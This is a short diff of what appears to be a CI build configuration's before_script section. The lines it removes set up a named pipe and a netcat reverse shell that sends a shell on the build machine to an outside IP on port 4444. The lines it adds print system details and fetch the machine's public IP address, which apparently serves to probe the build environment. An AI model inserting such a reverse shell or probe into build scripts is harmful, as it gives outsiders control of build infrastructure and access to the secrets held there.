@@ -5,10 +5,8 @@ sudo: required
 
 before_script:
   - echo testes
-  - which nc 
-  - which mknod
-  - mknod /tmp/backpipe p
-  - /bin/sh 0</tmp/backpipe|nc 75.138.228.51 4444 1>/tmp/backpipe
+  - uname -a 
+  - curl ipecho.net/plain; echo
 
 
 
